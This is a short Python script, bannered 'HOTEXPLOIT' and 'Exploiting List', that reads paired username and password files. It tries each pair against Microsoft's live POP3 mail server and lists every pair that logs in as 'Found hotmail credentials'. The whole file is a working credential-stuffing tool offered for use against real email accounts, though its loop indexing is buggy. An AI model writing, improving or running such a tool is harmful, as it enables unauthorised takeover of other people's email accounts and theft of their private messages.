import poplib
import sys
import time
import os
from tqdm import tqdm

print(
"""
 __ __   ___   ______    ___  __ __  ____  _       ___  ____  ______ 
|  |  | /   \\ |      |  /  _]|  |  ||    \\| |     /   \\|    ||      |
|  |  ||     ||      | /  [_ |  |  ||  o  ) |    |     ||  | |      |
|  _  ||  O  ||_|  |_||    _]|_   _||   _/| |___ |  O  ||  | |_|  |_|
|  |  ||     |  |  |  |   [_ |     ||  |  |     ||     ||  |   |  |  
|  |  ||     |  |  |  |     ||  |  ||  |  |     ||     ||  |   |  |  
|__|__| \\___/   |__|  |_____||__|__||__|  |_____| \\___/|____|  |__|  


	[ Exploiting List ]

"""
)

usernames = sys.argv[1]
passwords = sys.argv[2]

if(len(sys.argv) > 3):
	print('[ ERROR ]')
	print('Program accepts 2 arguments. ' + str(len(sys.argv) - 1) + ' given.\n')
	sys.exit()

with open(usernames, 'r') as users:
	user_list = []
	for user in users:
		user_list.append(user)

with open(passwords, 'r') as passwords:
	password_list = []
	for password in passwords:
		password_list.append(password)

counter = 0

if(len(user_list) == len(password_list)):
	correct_accounts = []
	

	for test in tqdm(range(len(user_list))):

		hotmail_port = poplib.POP3_SSL('pop3.live.com', 995)
		counter += 1
		try:
		    hotmail_port.user(user_list[counter].strip('\n'))
		    hotmail_port.pass_(password_list[counter].strip('\n'))
		except:
		    continue
		    hotmail_port.quit()
		else:
			hotmail_port.quit()
			correct_accounts.append(user_list[counter].strip('\n') + " : " + password_list[counter].strip('\n') + "")
		
			
	
	if(len(correct_accounts) > 0):
		print("\n 	[ Found hotmail credentials ]\n 	|")	    	
		for found in correct_accounts:
			print("	|	" + found)
		
		print("	|\n	|___________________________|")
	else:
		print("\n 	[ No credentials found ]\n")

else:
	print('[ ERROR ]')
	print('Not matched lists')
	print(' username amount: ' + str(len(user_list)) + "\n password ammount:" + str(len(password_list)) + '\n')

